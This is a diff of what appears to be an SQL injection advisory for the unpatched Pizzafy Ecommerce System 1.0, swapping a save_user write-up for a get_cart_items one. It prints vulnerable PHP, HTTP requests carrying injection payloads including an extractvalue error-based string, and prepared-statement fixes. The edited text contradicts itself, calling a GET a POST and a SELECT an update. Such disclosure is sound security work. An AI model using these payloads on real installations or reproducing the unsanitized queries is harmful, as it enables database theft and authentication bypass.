@@ -8,17 +8,17 @@
 - **Status:** Unpatched  
 
 ## **Vulnerable Endpoint:**  
-- `/pizza/admin/ajax.php?action=save_user`
+- `/pizza/admin/ajax.php?action=get_cart_items&id=1`
 
 ## **Overview**
-The Pizzafy Ecommerce System 1.0 contains critical SQL Injection vulnerabilities that allow an attacker to extract sensitive data, bypass authentication, and get records from the database.
+The Pizzafy Ecommerce System 1.0 contains multiple critical SQL Injection vulnerabilities that allow an attacker to extract sensitive data, bypass authentication, and get records from the database.
 
 ## **Vulnerability Description:**  
 # Error-Based SQL Injection Vulnerability in SELECT Operation
 
 ## Vulnerability Description
 
-A **Error-based SQL Injection vulnerability** was discovered in the **select count functionality** of the **Pizzafy Ecommerce System 1.0**. This vulnerability occurs because the `id` parameter and `id` column is not properly sanitized, allowing an attacker to inject malicious SQL commands into the backend database query.
+A **Error-based SQL Injection vulnerability** was discovered in the **update functionality** of the **Pizzafy Ecommerce System 1.0**. This vulnerability occurs because the `id` parameter and `user_id` column is not properly sanitized, allowing an attacker to inject malicious SQL commands into the backend database query.
 
 ## Attack Technique
 
@@ -43,87 +43,76 @@ This attack relies on **Error-based SQL injection technique**, where the attacke
 
 ### Vulnerable Code
 ```php
-public function save_user() {
+public function get_cart_items() {
+    if(!isset($_SESSION['login_user_id'])) {
+        return ['items' => []];
+    }
+    
+    $user_id = $_SESSION['login_user_id'];
+    
+    if (isset($_GET['id'])) {
+        $user_id = $_GET['id'];            
+    }
+    
+    $sql = "SELECT c.id as cart_id, c.product_id, c.qty, p.name, p.price 
+            FROM cart c 
+            JOIN product_list p ON c.product_id = p.id 
+            WHERE c.user_id = $user_id";
+    
+    $result = $this->conn->query($sql);    
+    
+    if (!$result) {    
+        return ['items' => [], 'error' => $this->conn->error];
+    }
 
-    if(!isset($_SESSION['login_id'])) {
-        return 2;
-    }    
-    extract($_POST);
-
-    if(!empty($id)) {
-        $sql = "SELECT * FROM users WHERE (username = '$username') AND id != $id";
-    } else {
-        $sql = "SELECT * FROM users WHERE username = '$username'";
-    }
+    $items = [];
+    $total = 0;
     
-    $check = $this->conn->query($sql);
-
-    if (!$check) {
-        return "Erro SQL: " . $this->conn->error . " | Query: " . $sql;
-    }
-    
-    if($check->num_rows > 0) {
-        return 3;
-    }
-    
-    $data = " name = '$name' ";
-    $data .= ", username = '$username' ";
-    $data .= ", type = '$type' ";
-    
-    if(!empty($password)) {
-        $hashed_password = password_hash($password, PASSWORD_DEFAULT);
-        $data .= ", password = '$hashed_password' ";
-    }
-    
-    if(empty($id)) {
-        $sql_insert = "INSERT INTO users SET $data";
-        $save = $this->conn->query($sql_insert);
-        if(!$save) {
-            return "Erro SQL Insert: " . $this->conn->error . " | Query: " . $sql_insert;
+    if($result && $result->num_rows > 0) {
+        while($row = $result->fetch_assoc()) {
+            $subtotal = $row['price'] * $row['qty'];
+            $total += $subtotal;
+            $items[] = [
+                'cart_id' => $row['cart_id'],
+                'product_id' => $row['product_id'],
+                'name' => $row['name'],
+                'qty' => $row['qty'],
+                'price' => (float)$row['price'],
+                'subtotal' => (float)$subtotal
+            ];
         }
-        return 1;
-    } else {
-        $sql_update = "UPDATE users SET $data WHERE id = $id";
-        $save = $this->conn->query($sql_update);
-        if(!$save) {
-            return "Erro SQL Update: " . $this->conn->error . " | Query: " . $sql_update;
-        }
-        return 1;
     }
+    
+    return ['items' => $items, 'total' => $total];
 }
 ```
 
-Below is a **POST** request demonstrating the vulnerability using a **time-based SQL injection payload**:  
+Below is a **POST** request demonstrating the vulnerability using a **Error-Based SQL injection payload**:  
 
 ```
-POST /pizza/admin/ajax.php?action=save_user HTTP/1.1
+GET /pizza/admin/ajax.php?action=get_cart_items&id=1' HTTP/1.1
 Host: localhost
-Content-Length: 69
 sec-ch-ua: 
-Accept: */*
-Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Accept: application/json, text/javascript, */*; q=0.01
 X-Requested-With: XMLHttpRequest
 sec-ch-ua-mobile: ?0
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
 sec-ch-ua-platform: ""
-Origin: http://localhost
 Sec-Fetch-Site: same-origin
 Sec-Fetch-Mode: cors
 Sec-Fetch-Dest: empty
-Referer: http://localhost/pizza/admin/index.php?page=users
+Referer: http://localhost/pizza/index.php?page=home
 Accept-Encoding: gzip, deflate
 Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
-Cookie: PHPSESSID=kqdkkqjdujc30ar9iniedtaoeg
+Cookie: PHPSESSID=jeku15623h3gva8eql2jpr5g4i
 Connection: close
-
-username=admin' AND extractvalue(1,concat(0x7e,version())) AND '1'='1
 ```
 
 ### **Explanation:**  
 This payload injects the SQL command:  
 
 ```sql
-username=admin' AND extractvalue(1,concat(0x7e,version())) AND '1'='1
+id=1'
 ```
 This makes it possible to get data from the database.
 
@@ -131,66 +120,56 @@ This makes it possible to get data from the database.
 
 ## Image
 
-- ![](https://i.imgur.com/sSiqO4P.png)
+- ![](https://i.imgur.com/lsBfj1i.png)
 ---
 
 ## Remediation
 ```php
-public function save_user() {
-
-    if(!isset($_SESSION['login_id'])) {
-        return 2;
-    }    
+public function get_cart_items() {
+    if(!isset($_SESSION['login_user_id'])) {
+        return ['items' => []];
+    }
     
-     $id = isset($_POST['id']) ? (int)$_POST['id'] : 0;
-    $name = isset($_POST['name']) ? $_POST['name'] : '';
-    $username = isset($_POST['username']) ? $_POST['username'] : '';
-    $type = isset($_POST['type']) ? (int)$_POST['type'] : 0;
-    $password = isset($_POST['password']) ? $_POST['password'] : '';
+    $user_id = (int)$_SESSION['login_user_id'];
+    
+    // Remove the code
+    // if (isset($_GET['id'])) {
+    //     $user_id = $_GET['id'];            
+    // }
+    
  
-    if(!empty($id)) {
-        $stmt = $this->conn->prepare("SELECT * FROM users WHERE username = ? AND id != ?");
-        $stmt->bind_param("si", $username, $id);
-    } else {
-        $stmt = $this->conn->prepare("SELECT * FROM users WHERE username = ?");
-        $stmt->bind_param("s", $username);
-    }
-    
+    $stmt = $this->conn->prepare("SELECT c.id as cart_id, c.product_id, c.qty, p.name, p.price 
+                                  FROM cart c 
+                                  JOIN product_list p ON c.product_id = p.id 
+                                  WHERE c.user_id = ?");
+    $stmt->bind_param("i", $user_id);
     $stmt->execute();
-    $check = $stmt->get_result();
-
-    if($check->num_rows > 0) {
-        return 3;
-    }
+    $result = $stmt->get_result();
     
-    if(empty($id)) {
+    if (!$result) {    
+        error_log("Erro em get_cart_items: " . $this->conn->error);
+        return ['items' => []];
+    }
 
-        if(!empty($password)) {
-            $hashed_password = password_hash($password, PASSWORD_DEFAULT);
-            $stmt = $this->conn->prepare("INSERT INTO users (name, username, type, password) VALUES (?, ?, ?, ?)");
-            $stmt->bind_param("ssis", $name, $username, $type, $hashed_password);
-        } else {
-            $stmt = $this->conn->prepare("INSERT INTO users (name, username, type) VALUES (?, ?, ?)");
-            $stmt->bind_param("ssi", $name, $username, $type);
-        }
-    } else {
-
-        if(!empty($password)) {
-            $hashed_password = password_hash($password, PASSWORD_DEFAULT);
-            $stmt = $this->conn->prepare("UPDATE users SET name = ?, username = ?, type = ?, password = ? WHERE id = ?");
-            $stmt->bind_param("ssisi", $name, $username, $type, $hashed_password, $id);
-        } else {
-            $stmt = $this->conn->prepare("UPDATE users SET name = ?, username = ?, type = ? WHERE id = ?");
-            $stmt->bind_param("ssii", $name, $username, $type, $id);
+    $items = [];
+    $total = 0;
+    
+    if($result && $result->num_rows > 0) {
+        while($row = $result->fetch_assoc()) {
+            $subtotal = $row['price'] * $row['qty'];
+            $total += $subtotal;
+            $items[] = [
+                'cart_id' => $row['cart_id'],
+                'product_id' => $row['product_id'],
+                'name' => $row['name'],
+                'qty' => $row['qty'],
+                'price' => (float)$row['price'],
+                'subtotal' => (float)$subtotal
+            ];
         }
     }
     
-    if($stmt->execute()) {
-        return 1;
-    } else {
-        error_log("Erro ao salvar usuário: " . $stmt->error);
-        return 0;
-    }
+    return ['items' => $items, 'total' => $total];
 }
 ```
 
@@ -198,7 +177,7 @@ public function save_user() {
 
 ## **Mitigation Recommendations:**  
 1. **Use Prepared Statements:** Employ parameterized queries to prevent SQL injection.  
-2. **Input Validation:** Validate and sanitize the `username` parameter to allow only expected values.  
+2. **Input Validation:** Validate and sanitize the `id` parameter and `id` column to allow only expected values.  
 3. **Database Permissions:** Restrict database user privileges to limit the potential damage of SQL injections.  
 4. **Monitoring & Logging:** Track and alert unusual patterns, such as slow queries or repetitive access attempts.  
 5. **Security Testing:** Perform regular penetration testing and code reviews to identify and mitigate vulnerabilities.  
